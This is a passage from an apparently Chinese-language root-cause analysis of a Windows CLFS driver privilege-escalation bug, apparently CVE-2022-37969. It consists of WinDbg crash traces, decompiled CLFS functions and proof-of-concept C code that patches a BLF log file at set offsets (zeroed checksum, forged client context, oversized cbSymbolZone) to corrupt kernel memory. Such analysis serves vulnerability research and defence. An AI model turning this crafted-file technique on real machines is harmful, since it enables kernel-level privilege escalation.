style="color:#960050;background-color:#1e0010">`</span>4f3844e0 00000000 00000000 4bd8b7c0 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844f0 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384500 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384510 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384520 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384530 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384540 00000000 00000000 00000000 00000000</span></span></code></pre></div><p>继续运行则触发异常</p><pre tabindex="0"><code>1: kd> k
# Child-SP RetAddr Call Site
00 ffffb807`d4c5f6d8 fffff801`28112c22 nt!DbgBreakPointWithStatus
01 ffffb807`d4c5f6e0 fffff801`28112206 nt!KiBugCheckDebugBreak+0x12
02 ffffb807`d4c5f740 fffff801`27ff89c7 nt!KeBugCheck2+0x946
03 ffffb807`d4c5fe50 fffff801`2800a869 nt!KeBugCheckEx+0x107
04 ffffb807`d4c5fe90 fffff801`28009cbc nt!KiBugCheckDispatch+0x69
05 ffffb807`d4c5ffd0 fffff801`280017af nt!KiSystemServiceHandler+0x7c
06 ffffb807`d4c60010 fffff801`27ee2467 nt!RtlpExecuteHandlerForException+0xf
07 ffffb807`d4c60040 fffff801`27ee1066 nt!RtlDispatchException+0x297
08 ffffb807`d4c60760 fffff801`2800a9ac nt!KiDispatchException+0x186
09 ffffb807`d4c60e20 fffff801`28006b43 nt!KiExceptionDispatch+0x12c
0a ffffb807`d4c61000 fffff801`270cb2d5 nt!KiPageFault+0x443
0b ffffb807`d4c61190 fffff801`27098655 CLFS!CClfsContainer::Close+0xd
0c ffffb807`d4c611c0 fffff801`270987b6 CLFS!CClfsLogFcbPhysical::CloseContainers+0x69
0d ffffb807`d4c611f0 fffff801`27098761 CLFS!CClfsLogFcbPhysical::Finalize+0x42
0e ffffb807`d4c61220 fffff801`270bdf42 CLFS!CClfsLogFcbPhysical::Release+0xb1
0f ffffb807`d4c61280 fffff801`270c0878 CLFS!CClfsRequest::Close+0xd6
10 ffffb807`d4c612d0 fffff801`270c0747 CLFS!ClfsDispatchIoRequest+0x108
11 ffffb807`d4c61320 fffff801`27eabac5 CLFS!CClfsDriver::LogIoDispatch+0x27
12 ffffb807`d4c61350 fffff801`281f088f nt!IofCallDriver+0x55
13 ffffb807`d4c61390 fffff801`28219af0 nt!IopDeleteFile+0x14f
14 ffffb807`d4c61410 fffff801`27eae1a7 nt!ObpRemoveObjectRoutine+0x80
15 ffffb807`d4c61470 fffff801`28222449 nt!ObfDereferenceObjectWithTag+0xc7
16 ffffb807`d4c614b0 fffff801`282e3745 nt!ObCloseHandleTableEntry+0x6c9
17 ffffb807`d4c615f0 fffff801`2828fadd nt!ExSweepHandleTable+0xd5
18 ffffb807`d4c616a0 fffff801`282b6d98 nt!ObKillProcess+0x35
19 ffffb807`d4c616d0 fffff801`282760f6 nt!PspRundownSingleProcess+0x204
1a ffffb807`d4c61760 fffff801`282777f8 nt!PspExitThread+0x5f6
1b ffffb807`d4c61860 fffff801`27eb4d77 nt!KiSchedulerApcTerminate+0x38
1c ffffb807`d4c618a0 fffff801`27ffce90 nt!KiDeliverApc+0x487
1d ffffb807`d4c61950 fffff801`2800a35f nt!KiInitiateUserApc+0x70
1e ffffb807`d4c61a90 00007ffd`40c90994 nt!KiSystemServiceExit+0x9f
1f 0000005f`4e1ffa88 00007ffd`40c42dc7 ntdll!NtWaitForWorkViaWorkerFactory+0x14
20 0000005f`4e1ffa90 00007ffd`40497034 ntdll!TppWorkerThread+0x2f7
21 0000005f`4e1ffd90 00000000`00000000 0x00007ffd`40497034</code></pre><p>到<code>CClfsLogFcbPhysical::CloseContainers</code>查看伪代码可知，通过<code>CClfsBaseFile::AcquireContainerContext</code>函数获取到container context并存在v7变量中，而后将<code>v7→pContainer</code>指针取出，如果该指针不为零则将其传入<code>CClfsContainer::Close</code></p><pre tabindex="0"><code>__int64 __fastcall CClfsLogFcbPhysical::CloseContainers(CClfsLogFcbPhysical *this)
{
int v1; // esi
unsigned int v2; // edi
struct _CLFS_CONTAINER_CONTEXT *v4; // rbp
CClfsContainer *v5; // rcx
struct _CLFS_CONTAINER_CONTEXT *v7; // [rsp+30h] [rbp+8h] BYREF
v7 = 0i64;
v1 = 0;
v2 = *((_DWORD *)this + 341);
if ( v2 >= *((_DWORD *)this + 340) )
return (unsigned int)v1;
while ( 1 )
{
v1 = CClfsBaseFile::AcquireContainerContext(
*((CClfsBaseFile **)this + 85),
*((_DWORD *)this + (v2 &amp; 0x3FF) + 342),
&amp;v7);
if ( v1 &lt; 0 )
break;
v4 = v7;
if ( !v7 )
break;
v5 = (CClfsContainer *)*((_QWORD *)v7 + 3);
if ( v5 )
{
CClfsContainer::Close(v5);
(*(void (__fastcall **)(_QWORD))(**((_QWORD **)v4 + 3) + 8i64))(*((_QWORD *)v4 + 3));
*((_QWORD *)v4 + 3) = 0i64;
}
CClfsBaseFile::ReleaseContainerContext(*((CClfsBaseFile **)this + 85), &amp;v7);
if ( ++v2 >= *((_DWORD *)this + 340) )
return (unsigned int)v1;
}
return 3222929421i64;
}</code></pre><p>由于前面将这个指针的高四位清零，所以传入<code>CClfsContainer::Close</code>函数的指针为0x03</p><pre tabindex="0"><code>1: kd> rrcx
rcx=0000000000000003
1: kd> u
CLFS!CClfsLogFcbPhysical::CloseContainers+0x69:
fffff801`27098655 488b4d18 mov rcx,qword ptr [rbp+18h]
fffff801`27098659 488b01 mov rax,qword ptr [rcx]
fffff801`2709865c 488b4008 mov rax,qword ptr [rax+8]
fffff801`27098660 ff156abf0100 call qword ptr [CLFS!_guard_dispatch_icall_fptr (fffff801`270b45d0)]
fffff801`27098666 4883651800 and qword ptr [rbp+18h],0
fffff801`2709866b 488b8ba8020000 mov rcx,qword ptr [rbx+2A8h]
fffff801`27098672 488d542430 lea rdx,[rsp+30h]
fffff801`27098677 e8cc9d0200 call CLFS!CClfsBaseFile::ReleaseContainerContext (fffff801`270c2448)</code></pre><p>在<code>CClfsContainer::Close</code>函数内对该指针解引用，导致异常</p><pre tabindex="0"><code>CLFS!CClfsContainer::Close:
fffff801`270cb2c8 48895c2408 mov qword ptr [rsp+8], rbx
fffff801`270cb2cd 57 push rdi
fffff801`270cb2ce 4883ec20 sub rsp, 20h
fffff801`270cb2d2 488bd9 mov rbx, rcx
fffff801`270cb2d5 488b4920 mov rcx, qword ptr [rcx+20h]</code></pre><p><strong>第二种方式</strong></p><p>第二种方式是修改<code>cbSymbolZone</code> 为超大的值，使得<code>BaseLogRecord+0x1338+cbSymbolZone</code> 能够到达下一个<code>BaseLogRecord</code>的<code>container context</code>，并利用<code>memset</code>将<code>container_context→pContainer</code>指针的高四位清零。</p><p>在<code>CLFS!CClfsBaseFilePersisted::ReadMetadataBlock</code>断点</p><pre tabindex="0"><code>bp CLFS!CClfsBaseFilePersisted::ReadMetadataBlock</code></pre><p>运行PoC，在<code>ReadMetadataBlock</code>断下</p><pre tabindex="0"><code>1: kd> rrdx
rdx=0000000000007a00
1: kd> k
# Child-SP RetAddr Call Site
00 fffff389`53916f50 fffff806`62d9a395 CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa
01 fffff389`53916ff0 fffff806`62d9a204 CLFS!CClfsBaseFile::AcquireMetadataBlock+0x45
02 fffff389`53917020 fffff806`62d99c36 CLFS!CClfsBaseFilePersisted::ReadImage+0x1e8
03 fffff389`53917080 fffff806`62d62da2 CLFS!CClfsBaseFilePersisted::OpenImage+0x2fa
04 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0x326
05 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef
06 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97
07 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87
08 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27
09 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55
0a fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34
0b fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d
0c fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe
0d fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa
0e fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f
0f fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79
10 fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25
11 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14
12 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199
1: kd> u
CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa:
fffff806`62d940ba e8a1e02104 call nt!ExAllocatePoolWithTag (fffff806`66fb2160)
fffff806`62d940bf 488bf0 mov rsi,rax
fffff806`62d940c2 4889442438 mov qword ptr [rsp+38h],rax
fffff806`62d940c7 4885c0 test rax,rax</code></pre><p><code>ReadMetadataBlock</code>调用<code>nt!ExAllocatePoolWithTag</code>分配内核堆存储基本记录，调试器中可以看到内存分配在<code>ffffab0523ecf000</code></p><pre tabindex="0"><code>1: kd> p
CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaf:
fffff806`62d940bf 488bf0 mov rsi,rax
1: kd> rrax
rax=ffffab0523ecf000</code></pre><p>在下面两个地方下断点</p><pre tabindex="0"><code>ba w8 ffffab0523ecf000+0x68
ba w8 ffffab0523ecf000+0x200*0xE-0x8</code></pre><p>这两个地方分别是<code>LogBlockHeader→SignatureOffset</code>和第十四个扇区签名的位置(0xc*0x200 + 0x1fe)</p><p>继续运行，在第二个断点断下，调用栈：</p><pre tabindex="0"><code>1: kd> k
# Child-SP RetAddr Call Site
00 fffff389`539170c0 fffff806`62d63672 CLFS!CClfsLogFcbPhysical::ResetLog+0x100
01 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0xbf6
02 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef
03 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97
04 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87
05 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27
06 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55
07 fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34
08 fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d
09 fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe
0a fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa
0b fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f
0c fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79
0d fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25
0e 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14
0f 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199
1: kd> ub
CLFS!CClfsLogFcbPhysical::ResetLog+0xd7:
fffff806`62d7151b 48894140 mov qword ptr [rcx+40h],rax
fffff806`62d7151f 488b83d8010000 mov rax,qword ptr [rbx+1D8h]
fffff806`62d71526 48894148 mov qword ptr [rcx+48h],rax
fffff806`62d7152a 488b83e8010000 mov rax,qword ptr [rbx+1E8h]
fffff806`62d71531 48894150 mov qword ptr [rcx+50h],rax
fffff806`62d71535 488b83f0010000 mov rax,qword ptr [rbx+1F0h]
**fffff806`62d7153c 48894158 mov qword ptr [rcx+58h],rax**
fffff806`62d71540 806178df and byte ptr [rcx+78h],0DFh
1: kd> rrcx
rcx=ffffab0523ed0ba0</code></pre><p>继续运行，rcx+0x58的位置已经被<code>0xFFFFFFFF00000000</code>覆盖了，而<code>rcx+0x5e = ffffab0523ecf000 + 0xd * 0x200 + 0x1FE</code>，也就是rcx+0x5e位于第十四扇区签名处，此时这个签名已经被<code>0xFFFF</code>覆盖了。</p><pre tabindex="0"><code>1: kd> db rcx
ffffab05`23ed0ba0 07 f0 fd c1 88 00 00 00-00 00 00 01 00 00 00 00 ................
ffffab05`23ed0bb0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0bc0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0bd0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0be0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0bf0 00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................
ffffab05`23ed0c00 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0c10 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</code></pre><p>对应伪代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsLogFcbPhysical<span style="color:#f92672">::</span><span style="color:#a6e22e">ResetLog</span>(CClfsLogFcbPhysical<span style="color:#f92672">*</span>this)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_CLIENT_CONTEXT<span style="color:#f92672">*</span>v2;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> .</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((CLFS_LSN<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>)<span style="color:#f92672">=</span> CLFS_LSN_INVALID;<span style="color:#75715e">// FF FF FF FF 00 00 00 00</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> .....</span></span><span style="display:flex;"><span> v2<span style="color:#f92672">-></span>lsnRestart.Internal<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>);<span style="color:#75715e">// 58h的偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">-></span>eState<span style="color:#f92672">&amp;=</span><span style="color:#f92672">~</span><span style="color:#ae81ff">0x20u</span>;</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ReleaseClientContext</span>(<span style="color:#f92672">*</span>((CClfsBaseFile<span style="color:#f92672">**</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>),<span style="color:#f92672">&amp;</span>v7);</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">ResetContainerQ</span>(</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((CClfsBaseFilePersisted<span style="color:#f92672">**</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>),</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">342</span>,</span></span><span style="display:flex;"><span> v4,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">340</span>,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">341</span>);</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">IncrementUsn</span>(<span style="color:#f92672">*</span>((CClfsBaseFilePersisted<span style="color:#f92672">**</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>));</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> (CClfsBaseFilePersisted<span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">657</span>)<span style="color:#f92672">=</span> v5;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">657</span>)<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">IncrementUsn</span>(v6);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>现在有三个问题：</p><ul><li>为什么<code>CLIENT_CONTEXT→lsnRestart.Internal</code>会和第十四个扇区签名重叠</li><li>怎么调用到<code>ResetLog</code>函数导致重叠区域被重置为<code>0xFFFF</code></li><li>为什么重叠的是第十四个不是其他</li></ul><p>回到PoC中，首先将BLF文件内偏移0x9A8，这是<code>CLFS_BASE_RECORD_HEADER→rgClients</code> ，该处伪造了假的<code>client context</code>偏移0x1b30</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/5.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> checkSum[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// {0x59, 0xdf, 0x44, 0x06}; // offset 0x80c</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> signaturOffset[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x868</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> ccoffsetArray[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x9a8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> cbsymbolZone[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x1b98</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> blockNameoffset[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x2390</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> blockAtributeoffset[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x2394</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">_wfopen_s</span>(<span style="color:#f92672">&amp;</span>pFile, stored_env_open,<span style="color:#e6db74">L</span><span style="color:#e6db74">"r+"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pFile<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"Cant't open file, error %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>,<span style="color:#a6e22e">GetLastError</span>());</span></span><span style="display:flex;"><span><span style="color:#75715e">// getchar();</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[+] file successfully opened</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 校验和</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x80c</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(checkSum,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(checkSum), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Signature 值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x868</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(signaturOffset,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(signaturOffset), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// client context的偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x9a8</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(ccoffsetArray,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(ccoffsetArray), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// cbsymbolZone偏移，写入恶意的cbsymbolZone</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x1b98</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(cbsymbolZone,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(cbsymbolZone), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x2390</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(blockNameoffset,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(blockNameoffset), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x2394</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(blockAtributeoffset,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(blockAtributeoffset), pFile);</span></span></code></pre></div><p>而后在偏移0x23a0(0x1b30+0x870)处伪造假的client context，伪造的假client context需要有正确的<code>client context</code>头，将原<code>client context</code>复制过去即可。此时<code>client context→lsnRestart.Internal = 0x23a0 + 0x58 = 23f8</code>，位于基本记录的<code>0x1bf8</code>处，第14个扇区的扇区签名位于<code>0xd * 0x200 + 0x1fe=1BFE</code> ，<code>client context→lsnRestart.Internal</code> 大小八个字节，刚好高二位能够覆盖到扇区签名。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> fakeClientcontext[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x88</span> };<span style="color:#75715e">// offset 0x23a0</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> fakeClientcontext2[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x23ab</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> fakeClientcontext3[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x2418</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">// Client context，伪造假的Client context头</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x23a0</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(fakeClientcontext,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(fakeClientcontext), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Client context，伪造假的Client context头</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x23ab</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(fakeClientcontext2,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(fakeClientcontext2), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Client context，伪造假的值，使得程序进入ResetLog</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x2418</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(fakeClientcontext3,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(fakeClientcontext3), pFile);</span></span></code></pre></div><p>而ResetLog中要覆盖八个字节，刚好将第十四个扇区签名覆盖为0xFFFF</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> v2<span style="color:#f92672">-></span>lsnRestart.Internal<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>);<span style="color:#75715e">// 58h的偏移</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsLogFcbPhysical<span style="color:#f92672">::</span><span style="color:#a6e22e">Initialize</span>(</span></span><span style="display:flex;"><span> ULONG_PTR a1,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> a4,</span></span><span style="display:flex;"><span> ULONG DesiredShareAccess,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a6,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> a7,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a8,</span></span><span style="display:flex;"><span> PFILE_OBJECT FileObject,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> a10)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AddRef</span>(v25);</span></span><span style="display:flex;"><span> EventObject<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">OpenImage</span>(<span style="color:#75715e">// 